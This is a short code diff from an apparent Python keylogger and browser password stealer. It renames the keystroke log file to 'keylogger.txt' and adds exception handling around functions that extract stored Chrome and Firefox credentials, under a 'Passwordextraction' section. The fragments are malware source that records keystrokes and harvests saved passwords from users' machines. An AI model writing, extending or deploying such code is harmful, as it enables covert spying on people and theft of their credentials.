@@ -181,9 +181,9 @@ def WritePasswordToFile(s):
     #save keystrokes to a file
     if not os.path.exists(str(get_path()) + "keystrokes"):
         os.makedirs(str(get_path()) + "keystrokes")
-        open(str(get_path()) + "/keystrokes/enc_dec.txt", "w")
+        open(str(get_path()) + "/keystrokes/keylogger.txt", "w")
     #Modus a + fuers updaten der datei
-    file = open(str(get_path()) + '/keystrokes/enc_dec.txt', 'a+') 
+    file = open(str(get_path()) + '/keystrokes/keylogger.txt', 'a+') 
     file.write(s)
     file.close()
 
@@ -320,6 +320,8 @@ def get_chrome_passwords(quiet=0):
             elif e[0] == 1168:
                 print("No credentials stored for this user.")
         return None
+    except: 
+        print("Chrome is not installed.")
     finally:
         conn.close()
         os.remove(chrome_path + ".bak")        
@@ -351,6 +353,8 @@ def get_firefox_passwords(quiet=0):
             elif e[0] == 1168:
                 print("No credentials stored for this user.")
         return None
+    except:
+        print("Firefox not installed.")
     finally:
         conn.close()
 #------------------------END Passwordextraction------------------------
